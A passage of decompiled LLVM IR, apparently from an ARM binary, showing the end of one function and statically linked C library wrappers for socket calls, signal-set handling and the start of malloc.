  %v1_1225c = icmp slt i32 %v7_12258, 0
  br i1 %v1_1225c, label %.dec_label_pc_12388_crit_edge, label %dec_label_pc_1226c

.dec_label_pc_12388_crit_edge:                    ; preds = %dec_label_pc_121dc
  store i32 2, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_12388

dec_label_pc_1226c:                               ; preds = %dec_label_pc_121dc
  store i32 256, i32* %r3.global-to-local, align 4
  %v1_12280 = load i32, i32* @r8, align 4
  %tmp35 = icmp ugt i32 %v1_12280, 255
  br i1 %tmp35, label %dec_label_pc_1231c, label %dec_label_pc_12288

dec_label_pc_12288:                               ; preds = %dec_label_pc_1226c
  %v3_12288 = load i32, i32* %stack_var_-96, align 4
  store i32 %v3_12288, i32* @r0, align 4
  %v0_1228c = call i32 @free()
  %v3_12290 = load i32, i32* %stack_var_-40, align 4
  store i32 %v3_12290, i32* @r0, align 4
  %v0_12294 = call i32 @free()
  store i32 %arg6, i32* %r3.global-to-local, align 4
  store i32 -1, i32* @ip, align 4
  store i32 34, i32* %r0.global-to-local, align 4
  store i32 -1, i32* %v1_120d4, align 4
  br label %dec_label_pc_123b4

dec_label_pc_1231c:                               ; preds = %dec_label_pc_1226c
  %v3_12320.pre = load i32, i32* %stack_var_-96, align 4
  %v0_12324.pre = load i32, i32* @r6, align 4
  store i32 %v1_12280, i32* %r2.global-to-local, align 4
  store i32 %v3_12320.pre, i32* @r1, align 4
  store i32 %v0_12324.pre, i32* %r0.global-to-local, align 4
  %v3_12328 = call i32 @strncpy(i32 %v0_12324.pre, i32 %v3_12320.pre, i32 %v1_12280)
  %v3_1232c = load i32, i32* %stack_var_-96, align 4
  store i32 %v3_1232c, i32* @r0, align 4
  %v0_12330 = call i32 @free()
  store i32 %v0_12330, i32* %r0.global-to-local, align 4
  store i32 %tmp7, i32* %r3.global-to-local, align 4
  %v7_12338 = icmp eq i32 %tmp7, 1
  br i1 %v7_12338, label %dec_label_pc_12340, label %dec_label_pc_12394

dec_label_pc_12340:                               ; preds = %dec_label_pc_1231c
  store i32 4, i32* @r2, align 4
  %v0_12348 = load i32, i32* @r7, align 4
  store i32 %v0_12348, i32* @r0, align 4
  %v0_1234c = call i32 @memcpy()
  store i32 2, i32* %r3.global-to-local, align 4
  store i32 %v1_12168, i32* %r2.global-to-local, align 4
  %v1_12358 = load i32, i32* @sl, align 4
  %v2_12358 = add i32 %v1_12358, 8
  %v3_12358 = inttoptr i32 %v2_12358 to i32*
  store i32 2, i32* %v3_12358, align 4
  %v0_1235c = load i32, i32* %r3.global-to-local, align 4
  %v2_1235c = mul i32 %v0_1235c, 2
  store i32 %v2_1235c, i32* %r3.global-to-local, align 4
  %v1_12360 = load i32, i32* @sl, align 4
  %v2_12360 = add i32 %v1_12360, 12
  %v3_12360 = inttoptr i32 %v2_12360 to i32*
  store i32 %v2_1235c, i32* %v3_12360, align 4
  %v3_12364 = load i32, i32* %stack_var_-40, align 4
  store i32 %v3_12364, i32* @r0, align 4
  %v0_12368 = load i32, i32* @r6, align 4
  %v1_12368 = load i32, i32* @sl, align 4
  %v2_12368 = inttoptr i32 %v1_12368 to i32*
  store i32 %v0_12368, i32* %v2_12368, align 4
  %v0_1236c = load i32, i32* @sb, align 4
  %v1_1236c = load i32, i32* @sl, align 4
  %v2_1236c = add i32 %v1_1236c, 16
  %v3_1236c = inttoptr i32 %v2_1236c to i32*
  store i32 %v0_1236c, i32* %v3_1236c, align 4
  %v0_12370 = load i32, i32* %r2.global-to-local, align 4
  %v1_12370 = load i32, i32* @sl, align 4
  %v2_12370 = add i32 %v1_12370, 4
  %v3_12370 = inttoptr i32 %v2_12370 to i32*
  store i32 %v0_12370, i32* %v3_12370, align 4
  %v0_12374 = call i32 @free()
  %v3_12378 = load i32, i32* %stack_var_0, align 4
  store i32 %v3_12378, i32* @ip, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_12380 = load i32, i32* @sl, align 4
  %v2_12380 = inttoptr i32 %v3_12378 to i32*
  store i32 %v0_12380, i32* %v2_12380, align 4
  %v0_12384 = load i32, i32* %r3.global-to-local, align 4
  store i32 %v0_12384, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_12388

dec_label_pc_12388:                               ; preds = %.dec_label_pc_12388_crit_edge, %dec_label_pc_12340
  %v0_1238c = phi i32 [ 1, %.dec_label_pc_12388_crit_edge ], [ %v0_12384, %dec_label_pc_12340 ]
  store i32 %arg6, i32* %r2.global-to-local, align 4
  store i32 %v0_1238c, i32* %v1_120d4, align 4
  br label %dec_label_pc_123b4

dec_label_pc_12394:                               ; preds = %dec_label_pc_1231c
  %v3_12394 = load i32, i32* %stack_var_-40, align 4
  store i32 %v3_12394, i32* @r0, align 4
  %v0_12398 = call i32 @free()
  store i32 %arg6, i32* @ip, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  store i32 2, i32* %r0.global-to-local, align 4
  store i32 1, i32* %v1_120d4, align 4
  br label %dec_label_pc_123b4

dec_label_pc_123b0:                               ; preds = %dec_label_pc_1210c, %dec_label_pc_12158, %dec_label_pc_1213c, %dec_label_pc_12130, %dec_label_pc_1211c
  store i32 34, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_123b4

dec_label_pc_123b4:                               ; preds = %bb, %dec_label_pc_120f0, %dec_label_pc_120e8, %dec_label_pc_12090, %dec_label_pc_12394, %dec_label_pc_12388, %dec_label_pc_12288, %dec_label_pc_121a4, %dec_label_pc_123b0
  store i32 %v6_12064, i32* @r5, align 4
  store i32 %v9_12064, i32* @r6, align 4
  store i32 %v12_12064, i32* @r7, align 4
  store i32 %v15_12064, i32* @r8, align 4
  store i32 %v18_12064, i32* @sb, align 4
  store i32 %v21_12064, i32* @sl, align 4
  store i32 %v24_12064, i32* @fp, align 4
  %v29_123b8 = load i32, i32* %r0.global-to-local, align 4
  ret i32 %v29_123b8

; uselistorder directives
  uselistorder i32 %v2_1235c, { 1, 0 }
  uselistorder i32 %v1_12280, { 1, 2, 0 }
  uselistorder i32 %v1_12168, { 1, 2, 0, 3 }
  uselistorder i32 %v1_12164, { 1, 0, 2 }
  uselistorder i32 %v1_12158, { 2, 1, 0, 3 }
  uselistorder i32 %v0_12124.pre, { 0, 2, 1 }
  uselistorder i32 %v1_12100, { 1, 0 }
  uselistorder i32* %v1_120d4, { 2, 3, 1, 0, 4 }
  uselistorder i32 %v0_12074, { 1, 0 }
  uselistorder i32* %stack_var_-96, { 1, 0, 2, 3 }
  uselistorder i32* %stack_var_0, { 1, 2, 3, 0 }
  uselistorder i32 %tmp7, { 1, 0 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 0 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 0 }
  uselistorder i32* %r0.global-to-local, { 19, 3, 4, 5, 6, 7, 8, 9, 12, 10, 11, 13, 15, 14, 16, 18, 17, 21, 20, 0, 1, 2 }
  uselistorder i32 %arg6, { 8, 7, 6, 5, 4, 3, 2, 0, 1 }
  uselistorder label %dec_label_pc_123b4, { 8, 4, 5, 6, 7, 1, 2, 3, 0 }
  uselistorder label %dec_label_pc_123b0, { 1, 2, 3, 4, 0 }
  uselistorder label %dec_label_pc_12388, { 1, 0 }
  uselistorder label %dec_label_pc_1211c, { 1, 0 }
}

define i32 @__libc_connect(i32 %arg1, %sockaddr* %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_123d8 = load i32, i32* @r4, align 4
  store i32 %v3_123d8, i32* %stack_var_-8, align 4
  %v5_123dc = call i32 @connect(i32 %arg1, %sockaddr* %arg2, i32 %arg3)
  store i32 %v5_123dc, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v5_123dc, -4095
  br i1 %tmp, label %dec_label_pc_123fc, label %dec_label_pc_123ec

dec_label_pc_123ec:                               ; preds = %entry
  %v0_123ec = call i32 @__errno_location()
  %v0_123f0 = load i32, i32* %r4.global-to-local, align 4
  %v1_123f0 = sub i32 0, %v0_123f0
  %v2_123f4 = inttoptr i32 %v0_123ec to i32*
  store i32 %v1_123f0, i32* %v2_123f4, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_123fc

dec_label_pc_123fc:                               ; preds = %entry, %dec_label_pc_123ec
  %v0_123fc = phi i32 [ %v5_123dc, %entry ], [ -1, %dec_label_pc_123ec ]
  %v2_12400 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_12400, i32* @r4, align 4
  ret i32 %v0_123fc

; uselistorder directives
  uselistorder i32 %v5_123dc, { 1, 0, 2 }
  uselistorder label %dec_label_pc_123fc, { 1, 0 }
}

define i32 @__GI_getsockname(i32 %arg1, %sockaddr* %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_12404 = load i32, i32* @r4, align 4
  store i32 %v3_12404, i32* %stack_var_-8, align 4
  %v5_12408 = inttoptr i32 %arg3 to i32*
  %v6_12408 = call i32 @getsockname(i32 %arg1, %sockaddr* %arg2, i32* %v5_12408)
  store i32 %v6_12408, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v6_12408, -4095
  br i1 %tmp, label %dec_label_pc_12428, label %dec_label_pc_12418

dec_label_pc_12418:                               ; preds = %entry
  %v0_12418 = call i32 @__errno_location()
  %v0_1241c = load i32, i32* %r4.global-to-local, align 4
  %v1_1241c = sub i32 0, %v0_1241c
  %v2_12420 = inttoptr i32 %v0_12418 to i32*
  store i32 %v1_1241c, i32* %v2_12420, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_12428

dec_label_pc_12428:                               ; preds = %entry, %dec_label_pc_12418
  %v0_12428 = phi i32 [ %v6_12408, %entry ], [ -1, %dec_label_pc_12418 ]
  %v2_1242c = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_1242c, i32* @r4, align 4
  ret i32 %v0_12428

; uselistorder directives
  uselistorder i32 %v6_12408, { 1, 0, 2 }
  uselistorder label %dec_label_pc_12428, { 1, 0 }
}

define i32 @getsockopt() local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_12430 = load i32, i32* @r4, align 4
  store i32 %v3_12430, i32* %stack_var_-8, align 4
  %v0_12438 = call i32 @getsockopt()
  store i32 %v0_12438, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v0_12438, -4095
  br i1 %tmp, label %dec_label_pc_12458, label %dec_label_pc_12448

dec_label_pc_12448:                               ; preds = %entry
  %v0_12448 = call i32 @__errno_location()
  %v0_1244c = load i32, i32* %r4.global-to-local, align 4
  %v1_1244c = sub i32 0, %v0_1244c
  %v2_12450 = inttoptr i32 %v0_12448 to i32*
  store i32 %v1_1244c, i32* %v2_12450, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_12458

dec_label_pc_12458:                               ; preds = %entry, %dec_label_pc_12448
  %v0_12458 = phi i32 [ %v0_12438, %entry ], [ -1, %dec_label_pc_12448 ]
  %v2_1245c = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_1245c, i32* @r4, align 4
  ret i32 %v0_12458

; uselistorder directives
  uselistorder i32 %v0_12438, { 1, 0, 2 }
  uselistorder i32 ()* @getsockopt, { 2, 1, 0 }
  uselistorder label %dec_label_pc_12458, { 1, 0 }
}

define i32 @__libc_recv(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_12460 = load i32, i32* @r4, align 4
  store i32 %v3_12460, i32* %stack_var_-8, align 4
  %v5_12464 = call i32 @recv(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4)
  store i32 %v5_12464, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v5_12464, -4095
  br i1 %tmp, label %dec_label_pc_12484, label %dec_label_pc_12474

dec_label_pc_12474:                               ; preds = %entry
  %v0_12474 = call i32 @__errno_location()
  %v0_12478 = load i32, i32* %r4.global-to-local, align 4
  %v1_12478 = sub i32 0, %v0_12478
  %v2_1247c = inttoptr i32 %v0_12474 to i32*
  store i32 %v1_12478, i32* %v2_1247c, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_12484

dec_label_pc_12484:                               ; preds = %entry, %dec_label_pc_12474
  %v0_12484 = phi i32 [ %v5_12464, %entry ], [ -1, %dec_label_pc_12474 ]
  %v2_12488 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_12488, i32* @r4, align 4
  ret i32 %v0_12484

; uselistorder directives
  uselistorder i32 %v5_12464, { 1, 0, 2 }
  uselistorder label %dec_label_pc_12484, { 1, 0 }
}

define i32 @__libc_send(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_1248c = load i32, i32* @r4, align 4
  store i32 %v3_1248c, i32* %stack_var_-8, align 4
  %v5_12490 = call i32 @send(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4)
  store i32 %v5_12490, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v5_12490, -4095
  br i1 %tmp, label %dec_label_pc_124b0, label %dec_label_pc_124a0

dec_label_pc_124a0:                               ; preds = %entry
  %v0_124a0 = call i32 @__errno_location()
  %v0_124a4 = load i32, i32* %r4.global-to-local, align 4
  %v1_124a4 = sub i32 0, %v0_124a4
  %v2_124a8 = inttoptr i32 %v0_124a0 to i32*
  store i32 %v1_124a4, i32* %v2_124a8, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_124b0

dec_label_pc_124b0:                               ; preds = %entry, %dec_label_pc_124a0
  %v0_124b0 = phi i32 [ %v5_12490, %entry ], [ -1, %dec_label_pc_124a0 ]
  %v2_124b4 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_124b4, i32* @r4, align 4
  ret i32 %v0_124b0

; uselistorder directives
  uselistorder i32 %v5_12490, { 1, 0, 2 }
  uselistorder label %dec_label_pc_124b0, { 1, 0 }
}

define i32 @__libc_sendto(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_124b8 = load i32, i32* @r4, align 4
  store i32 %v3_124b8, i32* %stack_var_-12, align 4
  store i32 %arg5, i32* %r4.global-to-local, align 4
  %v5_124c4 = call i32 @sendto(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4, %sockaddr* null, i32 0)
  store i32 %v5_124c4, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v5_124c4, -4095
  br i1 %tmp, label %dec_label_pc_124e4, label %dec_label_pc_124d4

dec_label_pc_124d4:                               ; preds = %entry
  %v0_124d4 = call i32 @__errno_location()
  %v0_124d8 = load i32, i32* %r4.global-to-local, align 4
  %v1_124d8 = sub i32 0, %v0_124d8
  %v2_124dc = inttoptr i32 %v0_124d4 to i32*
  store i32 %v1_124d8, i32* %v2_124dc, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_124e4

dec_label_pc_124e4:                               ; preds = %entry, %dec_label_pc_124d4
  %v0_124e4 = phi i32 [ %v5_124c4, %entry ], [ -1, %dec_label_pc_124d4 ]
  %v2_124e8 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_124e8, i32* @r4, align 4
  ret i32 %v0_124e4

; uselistorder directives
  uselistorder i32 %v5_124c4, { 1, 0, 2 }
  uselistorder label %dec_label_pc_124e4, { 1, 0 }
}

define i32 @__GI_setsockopt(i32 %arg1, i32 %arg2, i32 %arg3, i32* %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* @r2, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_124ec = load i32, i32* @r4, align 4
  store i32 %v3_124ec, i32* %stack_var_-8, align 4
  store i32 %arg5, i32* %r4.global-to-local, align 4
  %v5_124f4 = call i32 @setsockopt(i32 %arg1, i32 %arg2, i32 %arg3, i32* %arg4, i32 0)
  store i32 %v5_124f4, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v5_124f4, -4095
  br i1 %tmp, label %dec_label_pc_12514, label %dec_label_pc_12504

dec_label_pc_12504:                               ; preds = %entry
  %v0_12504 = call i32 @__errno_location()
  %v0_12508 = load i32, i32* %r4.global-to-local, align 4
  %v1_12508 = sub i32 0, %v0_12508
  %v2_1250c = inttoptr i32 %v0_12504 to i32*
  store i32 %v1_12508, i32* %v2_1250c, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_12514

dec_label_pc_12514:                               ; preds = %entry, %dec_label_pc_12504
  %v0_12514 = phi i32 [ %v5_124f4, %entry ], [ -1, %dec_label_pc_12504 ]
  %v2_12518 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_12518, i32* @r4, align 4
  ret i32 %v0_12514

; uselistorder directives
  uselistorder i32 %v5_124f4, { 1, 0, 2 }
  uselistorder label %dec_label_pc_12514, { 1, 0 }
}

define i32 @socket() local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_1251c = load i32, i32* @r4, align 4
  store i32 %v3_1251c, i32* %stack_var_-8, align 4
  %v0_12520 = call i32 @socket()
  store i32 %v0_12520, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v0_12520, -4095
  br i1 %tmp, label %dec_label_pc_12540, label %dec_label_pc_12530

dec_label_pc_12530:                               ; preds = %entry
  %v0_12530 = call i32 @__errno_location()
  %v0_12534 = load i32, i32* %r4.global-to-local, align 4
  %v1_12534 = sub i32 0, %v0_12534
  %v2_12538 = inttoptr i32 %v0_12530 to i32*
  store i32 %v1_12534, i32* %v2_12538, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_12540

dec_label_pc_12540:                               ; preds = %entry, %dec_label_pc_12530
  %v0_12540 = phi i32 [ %v0_12520, %entry ], [ -1, %dec_label_pc_12530 ]
  %v2_12544 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_12544, i32* @r4, align 4
  ret i32 %v0_12540

; uselistorder directives
  uselistorder i32 %v0_12520, { 1, 0, 2 }
  uselistorder label %dec_label_pc_12540, { 1, 0 }
}

define i32 @__GI_sigaddset(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r1, align 4
  %tmp2 = icmp slt i32 %arg1, 1
  br i1 %tmp2, label %dec_label_pc_12564, label %dec_label_pc_12554

dec_label_pc_12554:                               ; preds = %entry
  %v8_12558 = icmp sgt i32 %arg1, 64
  br i1 %v8_12558, label %dec_label_pc_12564, label %dec_label_pc_1255c

dec_label_pc_1255c:                               ; preds = %dec_label_pc_12554
  %v0_12560 = call i32 @__sigaddset()
  br label %dec_label_pc_12564

dec_label_pc_12564:                               ; preds = %dec_label_pc_12554, %entry, %dec_label_pc_1255c
  %v0_12564 = call i32 @__errno_location()
  %v2_1256c = inttoptr i32 %v0_12564 to i32*
  store i32 22, i32* %v2_1256c, align 4
  ret i32 -1

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_12564, { 2, 0, 1 }
}

define i32 @sigemptyset(i32 %arg1) local_unnamed_addr {
entry:
  store i32 128, i32* @r2, align 4
  %v0_12584 = load i32, i32* @r0, align 4
  %v2_12584 = inttoptr i32 %v0_12584 to i8*
  %v3_12584 = call i32 @__GI_memset(i8* %v2_12584, i32 0)
  ret i32 0
}

define i32 @__bsd_signal(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-148 = alloca i32, align 4
  %stack_var_-152 = alloca i32, align 4
  %stack_var_-292 = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_12590 = load i32, i32* @r4, align 4
  store i32 %v3_12590, i32* %stack_var_-12, align 4
  %v6_12590 = load i32, i32* @r5, align 4
  %v10_12590 = ptrtoint i32* %stack_var_-12 to i32
  %v7_12594 = icmp eq i32 %arg2, -1
  %v0_125a0.pre = load i32, i32* %r0.global-to-local, align 4
  br i1 %v7_12594, label %.thread, label %bb

.thread:                                          ; preds = %entry
  br label %dec_label_pc_125b8

bb:                                               ; preds = %entry
  %v2_1259c = ptrtoint i32* %stack_var_-292 to i32
  store i32 %v0_125a0.pre, i32* @r4, align 4
  %tmp19 = icmp slt i32 %v0_125a0.pre, 1
  br i1 %tmp19, label %dec_label_pc_125b8, label %dec_label_pc_125a8

dec_label_pc_125a8:                               ; preds = %bb
  %v7_125ac = icmp sgt i32 %v0_125a0.pre, 64
  br i1 %v7_125ac, label %dec_label_pc_125b8, label %bb20

bb20:                                             ; preds = %dec_label_pc_125a8
  store i32 %arg2, i32* %stack_var_-152, align 4
  store i32 31, i32* %r0.global-to-local, align 4
  %v5_125dc24 = add i32 %v10_12590, 124
  store i32 %v5_125dc24, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_125cc

dec_label_pc_125b8:                               ; preds = %.thread, %dec_label_pc_125a8, %bb
  %v0_125b8 = call i32 @__errno_location()
  store i32 %v0_125b8, i32* %r0.global-to-local, align 4
  store i32 -1, i32* %r2.global-to-local, align 4
  %v2_125c4 = inttoptr i32 %v0_125b8 to i32*
  store i32 22, i32* %v2_125c4, align 4
  %v0_12638.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_12638

dec_label_pc_125cc:                               ; preds = %bb20, %dec_label_pc_125cc
  %v5_125dc25 = phi i32 [ %v5_125dc24, %bb20 ], [ %v5_125dc, %dec_label_pc_125cc ]
  %v2_125d0 = add i32 %v5_125dc25, -136
  %v3_125d0 = inttoptr i32 %v2_125d0 to i32*
  store i32 0, i32* %v3_125d0, align 4
  %v0_125d4.pre = load i32, i32* %r0.global-to-local, align 4
  %v1_125d4 = add i32 %v0_125d4.pre, -1
  store i32 %v1_125d4, i32* %r0.global-to-local, align 4
  %v6_125d4 = icmp slt i32 %v1_125d4, 0
  %v4_125dc = mul i32 %v1_125d4, 4
  %v5_125dc = add i32 %v4_125dc, %v10_12590
  store i32 %v5_125dc, i32* %r2.global-to-local, align 4
  br i1 %v6_125d4, label %dec_label_pc_125e4, label %dec_label_pc_125cc

dec_label_pc_125e4:                               ; preds = %dec_label_pc_125cc
  %v2_125e4 = ptrtoint i32* %stack_var_-152 to i32
  store i32 %v2_125e4, i32* @r5, align 4
  %v2_125e8 = ptrtoint i32* %stack_var_-148 to i32
  store i32 %v2_125e8, i32* @r0, align 4
  %v0_125ec = load i32, i32* @r4, align 4
  store i32 %v0_125ec, i32* @r1, align 4
  %v0_125f0 = call i32 @__sigaddset()
  store i32 %v0_125f0, i32* %r0.global-to-local, align 4
  %v1_125f4 = icmp slt i32 %v0_125f0, 0
  br i1 %v1_125f4, label %dec_label_pc_12634, label %dec_label_pc_125fc

dec_label_pc_125fc:                               ; preds = %dec_label_pc_125e4
  %v0_125fc = load i32, i32* @r4, align 4
  store i32 ptrtoint (i32* @global_var_29db8.726 to i32), i32* %r0.global-to-local, align 4
  %v2_12604 = call i32 @__sigismember(i32 ptrtoint (i32* @global_var_29db8.726 to i32), i32 %v0_125fc)
  store i32 %v2_1259c, i32* %r2.global-to-local, align 4
  %v0_1261c = load i32, i32* @r4, align 4
  store i32 %v0_1261c, i32* %r0.global-to-local, align 4
  %v4_12624 = call i32 @__libc_sigaction(i32 %v0_1261c, i32* nonnull %stack_var_-152, i32 %v2_1259c)
  store i32 %v4_12624, i32* %r0.global-to-local, align 4
  %v1_12628 = icmp slt i32 %v4_12624, 0
  br i1 %v1_12628, label %dec_label_pc_12634, label %bb23

bb23:                                             ; preds = %dec_label_pc_125fc
  %v5_1262c = load i32, i32* %stack_var_-292, align 4
  store i32 %v5_1262c, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_12638

dec_label_pc_12634:                               ; preds = %dec_label_pc_125fc, %dec_label_pc_125e4
  store i32 -1, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_12638

dec_label_pc_12638:                               ; preds = %bb23, %dec_label_pc_125b8, %dec_label_pc_12634
  %v0_12638 = phi i32 [ %v5_1262c, %bb23 ], [ %v0_12638.pre, %dec_label_pc_125b8 ], [ -1, %dec_label_pc_12634 ]
  store i32 %v0_12638, i32* %r0.global-to-local, align 4
  %v2_12640 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_12640, i32* @r4, align 4
  store i32 %v6_12590, i32* @r5, align 4
  ret i32 %v0_12638

; uselistorder directives
  uselistorder i32 %v0_12638, { 1, 0 }
  uselistorder i32 %v5_125dc, { 1, 0 }
  uselistorder i32 %v1_125d4, { 0, 2, 1 }
  uselistorder i32 %v2_1259c, { 1, 0 }
  uselistorder i32 %v0_125a0.pre, { 1, 0, 2 }
  uselistorder i32 %v10_12590, { 1, 0 }
  uselistorder i32* %stack_var_-12, { 0, 2, 1 }
  uselistorder i32* %stack_var_-152, { 0, 2, 1 }
  uselistorder i32* %r0.global-to-local, { 2, 4, 3, 5, 7, 6, 9, 8, 10, 0, 1 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder label %dec_label_pc_12638, { 2, 0, 1 }
  uselistorder label %dec_label_pc_125cc, { 1, 0 }
  uselistorder label %dec_label_pc_125b8, { 1, 2, 0 }
}

define i32 @__sigismember(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v1_12648 = add i32 %arg2, -1
  %v3_1264c = udiv i32 %v1_12648, 32
  %v4_12650 = mul nuw nsw i32 %v3_1264c, 4
  %v5_12650 = add i32 %v4_12650, %arg1
  %v6_12650 = inttoptr i32 %v5_12650 to i32*
  %v7_12650 = load i32, i32* %v6_12650, align 4
  %v1_12654 = urem i32 %v1_12648, 32
  %v7_1265c = shl i32 1, %v1_12654
  %v8_1265c = and i32 %v7_12650, %v7_1265c
  %v10_1265c = icmp ne i32 %v8_1265c, 0
  %. = zext i1 %v10_1265c to i32
  ret i32 %.

; uselistorder directives
  uselistorder i32 %v1_12648, { 1, 0 }
}

define i32 @__sigaddset() local_unnamed_addr {
entry:
  %v0_1266c = load i32, i32* @r1, align 4
  %v1_1266c = add i32 %v0_1266c, -1
  %v3_12670 = udiv i32 %v1_1266c, 32
  %v0_12674 = load i32, i32* @r0, align 4
  %v4_12674 = mul nuw nsw i32 %v3_12670, 4
  %v5_12674 = add i32 %v0_12674, %v4_12674
  %v6_12674 = inttoptr i32 %v5_12674 to i32*
  %v7_12674 = load i32, i32* %v6_12674, align 4
  %v1_12678 = urem i32 %v1_1266c, 32
  %v7_12680 = shl i32 1, %v1_12678
  %v8_12680 = or i32 %v7_12674, %v7_12680
  store i32 %v8_12680, i32* %v6_12674, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v1_1266c, { 1, 0 }
}

define i32 @__sigdelset(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v1_12690 = add i32 %arg2, -1
  %v3_12694 = udiv i32 %v1_12690, 32
  %v4_12698 = mul nuw nsw i32 %v3_12694, 4
  %v5_12698 = add i32 %v4_12698, %arg1
  %v6_12698 = inttoptr i32 %v5_12698 to i32*
  %v7_12698 = load i32, i32* %v6_12698, align 4
  %v1_1269c = urem i32 %v1_12690, 32
  %tmp = shl i32 -1, %v1_1269c
  %v8_126a4 = add i32 %tmp, -1
  %v9_126a4 = and i32 %v7_12698, %v8_126a4
  store i32 %v9_126a4, i32* %v6_12698, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v1_12690, { 1, 0 }
}

define i32 @malloc(i32 %arg1) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-20 = alloca i32, align 4
  %v3_126b4 = load i32, i32* @r4, align 4
  %v6_126b4 = load i32, i32* @r5, align 4
  %v9_126b4 = load i32, i32* @r6, align 4
  %v0_126b8 = load i32, i32* %r0.global-to-local, align 4
  %v2_126b8 = icmp eq i32 %v0_126b8, 0
  %v2_126bc = ptrtoint i32* %stack_var_-20 to i32
  br i1 %v2_126b8, label %bb, label %dec_label_pc_126c8

bb:                                               ; preds = %entry
  store i32 1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_126d0

dec_label_pc_126c8:                               ; preds = %entry
  %tmp = icmp ugt i32 %v0_126b8, -8
  br i1 %tmp, label %dec_label_pc_127d4, label %dec_label_pc_126d0

dec_label_pc_126d0:                               ; preds = %bb, %dec_label_pc_126c8
  %v0_126d0 = phi i32 [ %v0_126b8, %dec_label_pc_126c8 ], [ 1, %bb ]
  %v1_126d0 = add i32 %v0_126d0, 4
  store i32 %v1_126d0, i32* %stack_var_-20, align 4
  store i32 %v2_126bc, i32* @r4, align 4
  store i32 ptrtoint (i32* @global_var_29d48.728 to i32), i32* %r0.global-to-local, align 4
  %v1_126e8 = call i32 @__pthread_return_0()
  store i32 ptrtoint (i32** @global_var_238f4.732 to i32), i32* %r0.global-to-local, align 4
